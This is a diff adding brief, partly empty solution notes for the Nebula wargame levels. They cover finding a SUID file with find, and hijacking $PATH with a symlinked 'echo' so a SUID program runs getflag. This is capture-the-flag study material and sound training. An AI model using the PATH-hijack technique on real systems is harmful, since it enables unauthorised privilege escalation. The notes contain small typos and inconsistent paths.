@@ -1,0 +1,27 @@
+NEBULA
+
+1. find SUID file that can be executed by flag00
+
+find / -user flag00 -executable -type f 2> /dev/null
+/bin/.../flag00
+getflagg
+
+2. file is calling the version of echo in /bin/env then displaying message.
+modify $PATH variable where /home/flag01 is at start of execution of variable
+
+export PATH=/home/level01/:$PATH
+now, create soft link to trick env into calling echo command which will point to getflag
+
+ln -s /bin/getflag /home/level01/echo
+
+
+3.
+
+4.
+
+
+5.
+
+
+6.
+
